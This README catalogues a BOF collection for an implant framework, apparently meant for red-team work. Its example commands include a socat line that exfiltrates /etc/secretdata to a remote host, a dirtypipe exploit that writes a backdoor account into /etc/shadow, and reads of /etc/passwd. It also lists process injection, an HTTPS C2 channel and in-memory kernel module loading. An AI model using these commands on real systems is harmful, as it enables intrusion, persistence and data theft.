# Z-Labs BOFs collection

BOFs developed and maintained by Z-Labs.

## Conventional BOFs

### Local Situational Awareness: SAL-BOF

| BOF name  | Description | Supported platforms | Example
| ------------- | ---------------------------------------------------- | --------------------------- | ------------------ |
| [lskmod](bofs/src/lskmod.zig) | list currently loaded kernel modules | `Linux x86/x86_64/ARMv6+/AArch64` | `lskmod` |
| [hostname](bofs/src/coreutils/hostname.zig) | show the system's host name | `Linux x86/x86_64/ARMv6+/AArch64` | `hostname` |
| [hostid](bofs/src/coreutils/hostid.zig) | print the numeric identifier for the current host | `Linux x86/x86_64/ARMv6+/AArch64` | `hostid` |
| [id](bofs/src/coreutils/id.zig) | print real and effective user and group IDs | `Linux x86/x86_64/ARMv6+/AArch64` | `id www-data` |
| [uname](bofs/src/coreutils/uname.zig) | print system information | `Linux x86/x86_64/ARMv6+/AArch64` | `uname -a` |
| [uptime](bofs/src/coreutils/uptime.zig) | show how long the system has been running | `Linux x86/x86_64/ARMv6+/AArch64` | `uptime` |
| [who](bofs/src/coreutils/who.zig) | print currently logged in users | `Linux x86/x86_64/ARMv6+/AArch64` | `who` |
| [ifconfig](bofs/src/net-tools/ifconfig.zig) | Display the status of the currently active network interfaces. With root privileges: also manipulate current state of the device | `Linux x86/x86_64/ARMv6+/AArch64` | `ifconfig eth0 promisc` |
| [whoami](bofs/src/whoami.zig) | On Linux: print effective user name; On Windows: output the current UserName and domain | `Linux x86/x86_64/ARMv6+/AArch64`; `Windows x86/x86_64` | `whoami` |
| [whereami](bofs/src/whereami.zig) | print hypervisor vendor signature from CPUID | `Linux x86/x86_64`; `Windows x86/x86_64` | `whereami` |
| [winver](bofs/src/wWinver.zig) | show the edition, version, and system type of Windows operating system | `Windows x86/x86_64` | `winver` |


### Filesystem interaction: FS-BOF

| BOF name  | Description | Supported platforms | Example
| ------------- | ---------------------------------------------------- | --------------------------- | ------------------ |
| [pwd](bofs/src/pwd.zig) | print name of current/working directory | `Linux x86/x86_64/ARMv6+/AArch64`; `Windows x86/x86_64` | `pwd` |
| [cd](bofs/src/cd.zig) | change working directory | `Linux x86/x86_64/ARMv6+/AArch64`; `Windows x86/x86_64` | `cd /` |
| [cat](bofs/src/cat.zig) | print content of a file | `Linux x86/x86_64/ARMv6+/AArch64`; `Windows x86/x86_64` | `cat /etc/passwd` |
| [zcat](bofs/src/zcat.zig) | print content of a gzip compressed file | `Linux x86/x86_64/ARMv6+/AArch64`; `Windows x86/x86_64` | `zcat /boot/config.gz` |
| [ls](bofs/src/ls.zig) | list directory content | `Linux x86/x86_64/ARMv6+/AArch64`; `Windows x86/x86_64` | `ls /etc` |
| [grep](bofs/src/grep.zig) | Print lines that match patterns | `Linux x86/x86_64/ARMv6+/AArch64`; `Windows x86/x86_64` | `grep root /etc/passwd` |
| [find](bofs/src/find.zig) | Search for files in a directory hierarchy | `Linux x86/x86_64/ARMv6+/AArch64`; `Windows x86/x86_64` | `find /dev -type b` |

### Networking: NET-BOF

| BOF name  | Description | Supported platforms | Example
| ------------- | ---------------------------------------------------- | --------------------------- | ------------------ |
| [socat](bofs/socat/) | Arbitrary TCP and TLS connections | `Linux x86/x86_64/ARMv6+/AArch64` | `socat OPEN:/etc/secretdata TLS:remotehost:8443` |

### Remote Situational Awareness: SAR-BOF

| BOF name  | Description | Supported platforms | Example
| ------------- | ---------------------------------------------------- | --------------------------- | ------------------ |
| [tcpScanner](bofs/src/tcpScanner.zig)  | TCP connect() port scanner  | `Linux x86/x86_64/ARMv6+/AArch64`; `Windows x86/x86_64` | `tcpScanner 4.3.2.1-255:22,80` |
| [udpScanner](bofs/src/udpScanner.zig) | UDP port sweeper | `Linux x86/x86_64/ARMv6+/AArch64`; `Windows x86/x86_64` | `udpScanner 4.3.2.1-255:5000-5010` |

### Context elevation: Elevation-BOF

| BOF name  | Description | Supported platforms | Example
| ------------- | ---------------------------------------------------- | --------------------------- | ------------------ |
| [dirtypipe](bofs/src/dirtypipe.zig) | Exploit for 'dirtypipe' vulnerability (CVE-2022-0847) implemented as a BOF | `Linux x86/x86_64/ARMv6+/AArch64` | `dirtypipe /etc/shadow 913 "backdoor:xxx:10123::::::"` 

### Process injection: Injection-BOF

| BOF name  | Description | Supported platforms | Example
| ------------- | ---------------------------------------------------- | --------------------------- | ------------------ |
| [processInjectionSrdi](bofs/src/wProcessInjectionSrdi.zig) | This BOF can inject any other BOF to any running process | `Windows x86/x86_64` | `cli4bofs inject file:abs_path_to_bof -i:<pid>` |


## Special purposes BOFs

### Implant core: BOF0

| BOF name  | Description | Supported platforms | Example
| ------------- | ---------------------------------------------------- | --------------------------- | ------------------ |
| [z-beac0n core](bofs/src/z-beac0n-core.zig) | Special purpose BOF so called `BOF zero`, it operates as standalone implant, manages other loaded BOFs; capable of executing other BOFs | `Linux x86/x86_64/ARMv6+/AArch64`; `Windows x86/x86_64` | `z-beac0n` |


### Implant C2 channel: C2-BOF

| BOF name  | Description | Supported platforms | Example
| ------------- | ---------------------------------------------------- | --------------------------- | ------------------ |
| [C2channelHTTPS](bofs/src/C2channelHTTPS.zig) | Special purpose API-style BOF providing HTTPS C2 communication channel | `Linux x86/x86_64/ARMv6+/AArch64`; `Windows x86/x86_64` | `-` |

### Implant misc APIs: API-BOF

| BOF name  | Description | Supported platforms | Example
| ------------- | ---------------------------------------------------- | --------------------------- | ------------------ |
| [kmodLoader](bofs/src/kmodLoader.zig) | API-style BOF; load/unload kernel module directly from memory (root privileges required) | `Linux x86/x86_64/ARMv6+/AArch64` | see docs |
